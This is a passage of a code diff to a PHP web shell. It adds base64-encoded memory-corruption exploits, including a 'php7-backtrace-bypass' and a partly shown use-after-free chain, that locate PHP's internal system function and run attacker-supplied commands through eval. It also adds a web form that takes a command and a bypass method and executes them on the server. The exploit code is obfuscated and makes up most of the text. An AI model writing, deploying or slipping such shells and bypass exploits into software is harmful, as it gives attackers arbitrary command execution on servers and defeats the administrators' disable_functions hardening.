cigkYWJjLCAweDIwKTsKCiAgICAkYmluYXJ5X2xlYWsgPSBsZWFrKCRjbG9zdXJlX2hhbmRsZXJzLCA4KTsKICAgIGlmKCEoJGJhc2UgPSBnZXRfYmluYXJ5X2Jhc2UoJGJpbmFyeV9sZWFrKSkpIHsKICAgICAgICBkaWUoIkNvdWxkbid0IGRldGVybWluZSBiaW5hcnkgYmFzZSBhZGRyZXNzIik7CiAgICB9CgogICAgaWYoISgkZWxmID0gcGFyc2VfZWxmKCRiYXNlKSkpIHsKICAgICAgICBkaWUoIkNvdWxkbid0IHBhcnNlIEVMRiBoZWFkZXIiKTsKICAgIH0KCiAgICBpZighKCRiYXNpY19mdW5jcyA9IGdldF9iYXNpY19mdW5jcygkYmFzZSwgJGVsZikpKSB7CiAgICAgICAgZGllKCJDb3VsZG4ndCBnZXQgYmFzaWNfZnVuY3Rpb25zIGFkZHJlc3MiKTsKICAgIH0KCiAgICBpZighKCR6aWZfc3lzdGVtID0gZ2V0X3N5c3RlbSgkYmFzaWNfZnVuY3MpKSkgewogICAgICAgIGRpZSgiQ291bGRuJ3QgZ2V0IHppZl9zeXN0ZW0gYWRkcmVzcyIpOwogICAgfQoKICAgICRmYWtlX29ial9vZmZzZXQgPSAweGQwOwogICAgZm9yKCRpID0gMDsgJGkgPCAweDExMDsgJGkgKz0gOCkgewogICAgICAgIHdyaXRlKCRhYmMsICRmYWtlX29ial9vZmZzZXQgKyAkaSwgbGVhaygkY2xvc3VyZV9vYmosICRpKSk7CiAgICB9CiAgICAKICAgIHdyaXRlKCRhYmMsIDB4MjAsICRhYmNfYWRkciArICRmYWtlX29ial9vZmZzZXQpOwogICAgd3JpdGUoJGFiYywgMHhkMCArIDB4MzgsIDEsIDQpOwogICAgd3JpdGUoJGFiYywgMHhkMCArIDB4NjgsICR6aWZfc3lzdGVtKTs=");
+    // unsafe eval
+    eval($code . "(\$helper->b)('$cmd');");
+}
+
+
+/**
+ * php7-backtrace-bypass
+ * @param $cmd 要执行的命令
+ */
+function json_bypass($cmd)
+{
+    $code = base64_decode("JG5fYWxsb2MgPSAxMDsKCmNsYXNzIE15U3BsRml4ZWRBcnJheSBleHRlbmRzIFNwbEZpeGVkQXJyYXkgewogICAgcHVibGljIHN0YXRpYyAkbGVhazsKfQoKY2xhc3MgWiBpbXBsZW1lbnRzIEpzb25TZXJpYWxpemFibGUgewogICAgcHVibGljIGZ1bmN0aW9uIHdyaXRlKCYkc3RyLCAkcCwgJHYsICRuID0gOCkgewogICAgICAkaSA9IDA7CiAgICAgIGZvcigkaSA9IDA7ICRpIDwgJG47ICRpKyspIHsKICAgICAgICAkc3RyWyRwICsgJGldID0gY2hyKCR2ICYgMHhmZik7CiAgICAgICAgJHYgPj49IDg7CiAgICAgIH0KICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gc3RyMnB0cigmJHN0ciwgJHAgPSAwLCAkcyA9IDgpIHsKICAgICAgICAkYWRkcmVzcyA9IDA7CiAgICAgICAgZm9yKCRqID0gJHMtMTsgJGogPj0gMDsgJGotLSkgewogICAgICAgICAgICAkYWRkcmVzcyA8PD0gODsKICAgICAgICAgICAgJGFkZHJlc3MgfD0gb3JkKCRzdHJbJHArJGpdKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRhZGRyZXNzOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBwdHIyc3RyKCRwdHIsICRtID0gOCkgewogICAgICAgICRvdXQgPSAiIjsKICAgICAgICBmb3IgKCRpPTA7ICRpIDwgJG07ICRpKyspIHsKICAgICAgICAgICAgJG91dCAuPSBjaHIoJHB0ciAmIDB4ZmYpOwogICAgICAgICAgICAkcHRyID4+PSA4OwogICAgICAgIH0KICAgICAgICByZXR1cm4gJG91dDsKICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gbGVhazEoJGFkZHIpIHsKICAgICAgICBnbG9iYWwgJHNwbDE7CgogICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCA4LCAkYWRkciAtIDB4MTApOwogICAgICAgIHJldHVybiBzdHJsZW4oZ2V0X2NsYXNzKCRzcGwxKSk7CiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIGxlYWsyKCRhZGRyLCAkcCA9IDAsICRzID0gOCkgewogICAgICAgIGdsb2JhbCAkc3BsMSwgJGZha2VfdGJsX29mZjsKCiAgICAgICAgJHRoaXMtPndyaXRlKCR0aGlzLT5hYmMsICRmYWtlX3RibF9vZmYgKyAweDEwLCAweGRlYWRiZWVmKTsKICAgICAgICAkdGhpcy0+d3JpdGUoJHRoaXMtPmFiYywgJGZha2VfdGJsX29mZiArIDB4MTgsICRhZGRyICsgJHAgLSAweDEwKTsKICAgICAgICAkdGhpcy0+d3JpdGUoJHRoaXMtPmFiYywgJGZha2VfdGJsX29mZiArIDB4MjAsIDYpOwoKICAgICAgICAkbGVhayA9IHN0cmxlbigkc3BsMTo6JGxlYWspOwogICAgICAgIGlmKCRzICE9IDgpIHsgJGxlYWsgJT0gMiA8PCAoJHMgKiA4KSAtIDE7IH0KCiAgICAgICAgcmV0dXJuICRsZWFrOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBwYXJzZV9lbGYoJGJhc2UpIHsKICAgICAgICAkZV90eXBlID0gJHRoaXMtPmxlYWsyKCRiYXNlLCAweDEwLCAyKTsKCiAgICAgICAgJGVfcGhvZmYgPSAkdGhpcy0+bGVhazIoJGJhc2UsIDB4MjApOwogICAgICAgICRlX3BoZW50c2l6ZSA9ICR0aGlzLT5sZWFrMigkYmFzZSwgMHgzNiwgMik7CiAgICAgICAgJGVfcGhudW0gPSAkdGhpcy0+bGVhazIoJGJhc2UsIDB4MzgsIDIpOwoKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICRlX3BobnVtOyAkaSsrKSB7CiAgICAgICAgICAgICRoZWFkZXIgPSAkYmFzZSArICRlX3Bob2ZmICsgJGkgKiAkZV9waGVudHNpemU7CiAgICAgICAgICAgICRwX3R5cGUgID0gJHRoaXMtPmxlYWsyKCRoZWFkZXIsIDAsIDQpOwogICAgICAgICAgICAkcF9mbGFncyA9ICR0aGlzLT5sZWFrMigkaGVhZGVyLCA0LCA0KTsKICAgICAgICAgICAgJHBfdmFkZHIgPSAkdGhpcy0+bGVhazIoJGhlYWRlciwgMHgxMCk7CiAgICAgICAgICAgICRwX21lbXN6ID0gJHRoaXMtPmxlYWsyKCRoZWFkZXIsIDB4MjgpOwoKICAgICAgICAgICAgaWYoJHBfdHlwZSA9PSAxICYmICRwX2ZsYWdzID09IDYpIHsKICAgICAgICAgICAgICAgICRkYXRhX2FkZHIgPSAkZV90eXBlID09IDIgPyAkcF92YWRkciA6ICRiYXNlICsgJHBfdmFkZHI7CiAgICAgICAgICAgICAgICAkZGF0YV9zaXplID0gJHBfbWVtc3o7CiAgICAgICAgICAgIH0gZWxzZSBpZigkcF90eXBlID09IDEgJiYgJHBfZmxhZ3MgPT0gNSkgewogICAgICAgICAgICAgICAgJHRleHRfc2l6ZSA9ICRwX21lbXN6OwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZighJGRhdGFfYWRkciB8fCAhJHRleHRfc2l6ZSB8fCAhJGRhdGFfc2l6ZSkKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwoKICAgICAgICByZXR1cm4gWyRkYXRhX2FkZHIsICR0ZXh0X3NpemUsICRkYXRhX3NpemVdOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRfYmFzaWNfZnVuY3MoJGJhc2UsICRlbGYpIHsKICAgICAgICBsaXN0KCRkYXRhX2FkZHIsICR0ZXh0X3NpemUsICRkYXRhX3NpemUpID0gJGVsZjsKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICRkYXRhX3NpemUgLyA4OyAkaSsrKSB7CiAgICAgICAgICAgICRsZWFrID0gJHRoaXMtPmxlYWsyKCRkYXRhX2FkZHIsICRpICogOCk7CiAgICAgICAgICAgIGlmKCRsZWFrIC0gJGJhc2UgPiAwICYmICRsZWFrIC0gJGJhc2UgPCAkZGF0YV9hZGRyIC0gJGJhc2UpIHsKICAgICAgICAgICAgICAgICRkZXJlZiA9ICR0aGlzLT5sZWFrMigkbGVhayk7CiAgICAgICAgICAgICAgICBpZigkZGVyZWYgIT0gMHg3NDZlNjE3NDczNmU2ZjYzKQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9IGVsc2UgY29udGludWU7CgogICAgICAgICAgICAkbGVhayA9ICR0aGlzLT5sZWFrMigkZGF0YV9hZGRyLCAoJGkgKyA0KSAqIDgpOwogICAgICAgICAgICBpZigkbGVhayAtICRiYXNlID4gMCAmJiAkbGVhayAtICRiYXNlIDwgJGRhdGFfYWRkciAtICRiYXNlKSB7CiAgICAgICAgICAgICAgICAkZGVyZWYgPSAkdGhpcy0+bGVhazIoJGxlYWspOwogICAgICAgICAgICAgICAgaWYoJGRlcmVmICE9IDB4Nzg2NTY4MzI2ZTY5NjIpCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0gZWxzZSBjb250aW51ZTsKCiAgICAgICAgICAgIHJldHVybiAkZGF0YV9hZGRyICsgJGkgKiA4OwogICAgICAgIH0KICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0X2JpbmFyeV9iYXNlKCRiaW5hcnlfbGVhaykgewogICAgICAgICRiYXNlID0gMDsKICAgICAgICAkc3RhcnQgPSAkYmluYXJ5X2xlYWsgJiAweGZmZmZmZmZmZmZmZmYwMDA7CiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAweDEwMDA7ICRpKyspIHsKICAgICAgICAgICAgJGFkZHIgPSAkc3RhcnQgLSAweDEwMDAgKiAkaTsKICAgICAgICAgICAgJGxlYWsgPSAkdGhpcy0+bGVhazIoJGFkZHIsIDAsIDcpOwogICAgICAgICAgICBpZigkbGVhayA9PSAweDEwMTAyNDY0YzQ1N2YpIHsKICAgICAgICAgICAgICAgIHJldHVybiAkYWRkcjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0X3N5c3RlbSgkYmFzaWNfZnVuY3MpIHsKICAgICAgICAkYWRkciA9ICRiYXNpY19mdW5jczsKICAgICAgICBkbyB7CiAgICAgICAgICAgICRmX2VudHJ5ID0gJHRoaXMtPmxlYWsyKCRhZGRyKTsKICAgICAgICAgICAgJGZfbmFtZSA9ICR0aGlzLT5sZWFrMigkZl9lbnRyeSwgMCwgNik7CgogICAgICAgICAgICBpZigkZl9uYW1lID09IDB4NmQ2NTc0NzM3OTczKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPmxlYWsyKCRhZGRyICsgOCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGFkZHIgKz0gMHgyMDsKICAgICAgICB9IHdoaWxlKCRmX2VudHJ5ICE9IDApOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24ganNvblNlcmlhbGl6ZSgpIHsKICAgICAgICBnbG9iYWwgJHksICRjbWQsICRzcGwxLCAkZmFrZV90Ymxfb2ZmLCAkbl9hbGxvYzsKCiAgICAgICAgJGNvbnRpZ3VvdXMgPSBbXTsKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICRuX2FsbG9jOyAkaSsrKQogICAgICAgICAgICAkY29udGlndW91c1tdID0gbmV3IERhdGVJbnRlcnZhbCgnUFQxUycpOwoKICAgICAgICAkcm9vbSA9IFtdOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgJG5fYWxsb2M7ICRpKyspCiAgICAgICAgICAgICRyb29tW10gPSBuZXcgWigpOwoKICAgICAgICAkX3Byb3RlY3RvciA9ICR0aGlzLT5wdHIyc3RyKDAsIDc4KTsKCiAgICAgICAgJHRoaXMtPmFiYyA9ICR0aGlzLT5wdHIyc3RyKDAsIDc5KTsKICAgICAgICAkcCA9IG5ldyBEYXRlSW50ZXJ2YWwoJ1BUMVMnKTsKCiAgICAgICAgdW5zZXQoJHlbMF0pOwogICAgICAgIHVuc2V0KCRwKTsKCiAgICAgICAgJHByb3RlY3RvciA9ICIuJF9wcm90ZWN0b3IiOwoKICAgICAgICAkeCA9IG5ldyBEYXRlSW50ZXJ2YWwoJ1BUMVMnKTsKICAgICAgICAkeC0+ZCA9IDB4MjAwMDsKICAgICAgICAkeC0+aCA9IDB4ZGVhZGJlZWY7CgogICAgICAgIGlmKCR0aGlzLT5zdHIycHRyKCR0aGlzLT5hYmMpICE9IDB4ZGVhZGJlZWYpIHsKICAgICAgICAgICAgZGllKCdVQUYgZmFpbGVkLicpOwogICAgICAgIH0KCiAgICAgICAgJHNwbDEgPSBuZXcgTXlTcGxGaXhlZEFycmF5KCk7CiAgICAgICAgJHNwbDIgPSBuZXcgTXlTcGxGaXhlZEFycmF5KCk7CgogICAgICAgICRjbGFzc19lbnRyeSA9ICR0aGlzLT5zdHIycHRyKCR0aGlzLT5hYmMsIDB4MTIwKTsKICAgICAgICAkaGFuZGxlcnMgPSAkdGhpcy0+c3RyMnB0cigkdGhpcy0+YWJjLCAweDEyOCk7CiAgICAgICAgJHBocF9oZWFwID0gJHRoaXMtPnN0cjJwdHIoJHRoaXMtPmFiYywgMHgxYTgpOwogICAgICAgICRhYmNfYWRkciA9ICRwaHBfaGVhcCAtIDB4MjE4OwoKICAgICAgICAkZmFrZV9vYmogPSAkYWJjX2FkZHI7CiAgICAgICAgJHRoaXMtPndyaXRlKCR0aGlzLT5hYmMsIDAsIDIpOwogICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCAweDEyMCwgJGFiY19hZGRyKTsKCgogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgMTY7ICRpKyspIHsKICAgICAgICAgICAgJHRoaXMtPndyaXRlKCR0aGlzLT5hYmMsIDB4MTAgKyAkaSAqIDgsIAogICAgICAgICAgICAgICAgJHRoaXMtPmxlYWsxKCRjbGFzc19lbnRyeSArIDB4MTAgKyAkaSAqIDgpKTsKICAgICAgICB9CgogICAgICAgICRmYWtlX3RibF9vZmYgPSAweDcwICogNCAtIDE2OwogICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCAweDMwLCAkYWJjX2FkZHIgKyAkZmFrZV90Ymxfb2ZmKTsKICAgICAgICAkdGhpcy0+d3JpdGUoJHRoaXMtPmFiYywgMHgzOCwgJGFiY19hZGRyICsgJGZha2VfdGJsX29mZik7CgogICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCAkZmFrZV90Ymxfb2ZmLCAkYWJjX2FkZHIgKyAkZmFrZV90Ymxfb2ZmICsgMHgxMCk7CiAgICAgICAgJHRoaXMtPndyaXRlKCR0aGlzLT5hYmMsICRmYWtlX3RibF9vZmYgKyA4LCAxMCk7CgogICAgICAgICRiaW5hcnlfbGVhayA9ICR0aGlzLT5sZWFrMigkaGFuZGxlcnMgKyAweDEwKTsKICAgICAgICBpZighKCRiYXNlID0gJHRoaXMtPmdldF9iaW5hcnlfYmFzZSgkYmluYXJ5X2xlYWspKSkgewogICAgICAgICAgICBkaWUoIkNvdWxkbid0IGRldGVybWluZSBiaW5hcnkgYmFzZSBhZGRyZXNzIik7CiAgICAgICAgfQoKICAgICAgICBpZighKCRlbGYgPSAkdGhpcy0+cGFyc2VfZWxmKCRiYXNlKSkpIHsKICAgICAgICAgICAgZGllKCJDb3VsZG4ndCBwYXJzZSBFTEYiKTsKICAgICAgICB9CgogICAgICAgIGlmKCEoJGJhc2ljX2Z1bmNzID0gJHRoaXMtPmdldF9iYXNpY19mdW5jcygkYmFzZSwgJGVsZikpKSB7CiAgICAgICAgICAgIGRpZSgiQ291bGRuJ3QgZ2V0IGJhc2ljX2Z1bmN0aW9ucyBhZGRyZXNzIik7CiAgICAgICAgfQoKICAgICAgICBpZighKCR6aWZfc3lzdGVtID0gJHRoaXMtPmdldF9zeXN0ZW0oJGJhc2ljX2Z1bmNzKSkpIHsKICAgICAgICAgICAgZGllKCJDb3VsZG4ndCBnZXQgemlmX3N5c3RlbSBhZGRyZXNzIik7CiAgICAgICAgfQogICAgICAgIAogICAgICAgICRmYWtlX2JrdF9vZmYgPSAweDcwICogNSAtIDE2OwoKICAgICAgICAkZnVuY3Rpb25fZGF0YSA9ICR0aGlzLT5zdHIycHRyKCR0aGlzLT5hYmMsIDB4NTApOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgNDsgJGkrKykgewogICAgICAgICAgICAkdGhpcy0+d3JpdGUoJHRoaXMtPmFiYywgJGZha2VfYmt0X29mZiArICRpICogOCwgCiAgICAgICAgICAgICAgICAkdGhpcy0+bGVhazIoJGZ1bmN0aW9uX2RhdGEgKyAweDQwICogNCwgJGkgKiA4KSk7CiAgICAgICAgfQoKICAgICAgICAkZmFrZV9ia3RfYWRkciA9ICRhYmNfYWRkciArICRmYWtlX2JrdF9vZmY7CiAgICAgICAgJHRoaXMtPndyaXRlKCR0aGlzLT5hYmMsIDB4NTAsICRmYWtlX2JrdF9hZGRyKTsKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8IDM7ICRpKyspIHsKICAgICAgICAgICAgJHRoaXMtPndyaXRlKCR0aGlzLT5hYmMsIDB4NTggKyAkaSAqIDQsIDEsIDQpOwogICAgICAgIH0KCiAgICAgICAgJGZ1bmN0aW9uX3p2YWwgPSAkdGhpcy0+c3RyMnB0cigkdGhpcy0+YWJjLCAkZmFrZV9ia3Rfb2ZmKTsKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8IDEyOyAkaSsrKSB7CiAgICAgICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCAgJGZha2VfYmt0X29mZiArIDB4NzAgKyAkaSAqIDgsIAogICAgICAgICAgICAgICAgJHRoaXMtPmxlYWsyKCRmdW5jdGlvbl96dmFsLCAkaSAqIDgpKTsKICAgICAgICB9CgogICAgICAgICR0aGlzLT53cml0ZSgkdGhpcy0+YWJjLCAkZmFrZV9ia3Rfb2ZmICsgMHg3MCArIDB4MzAsICR6aWZfc3lzdGVtKTsKICAgICAgICAkdGhpcy0+d3JpdGUoJHRoaXMtPmFiYywgJGZha2VfYmt0X29mZiwgJGZha2VfYmt0X2FkZHIgKyAweDcwKTsKCiAgICAgICAgJHNwbDEtPm9mZnNldEdldCgkY21kKTsKCiAgICAgICAgZXhpdCgpOwogICAgfQp9CgokeSA9IFtuZXcgWigpXTsKanNvbl9lbmNvZGUoWyYkeV0pOw==");
+    // unsafe eval
+    eval("\$cmd = '$cmd';" . $code);
+}
+
 ?>
-
 
 
 <!DOCTYPE html>
@@ -132,13 +227,15 @@
 <div>
     <!-- Show the required information -->
     <?php
-        show_basic();
-        get_disable(true);
+    show_basic();
+    get_disable(true);
     ?>
     <form method="post">
-        <!-- Generate the available functions list -->
-        <?php generate_select(); ?>
         <input type="text" name="cmd" placeholder="command" style="width: 200px">
+        <!-- Generate the available functions list -->
+        <?php generate_funcs(); ?>
+        <!-- Generate the bypass methods list -->
+        <?php generate_methods(); ?>
         <select name="encoding">
             <option>utf-8</option>
             <option>gbk</option>
@@ -147,11 +244,15 @@
         <input type="submit" value="exec">
     </form>
 </div>
-    <!-- Exec output -->
-    <?php
-        if ($_POST) {
-            exec_and_display($_POST['func'],$_POST['cmd']);
-        }
-    ?>
+<!-- Exec output -->
+<?php
+if ($_POST) {
+    if ($_POST['method'] == 'disable') {
+        exec_and_display($_POST['func'], $_POST['cmd']);
+    } else {
+        bypass_exec($_POST['method'], $_POST['cmd']);
+    }
+}
+?>
 </body>
 </html>
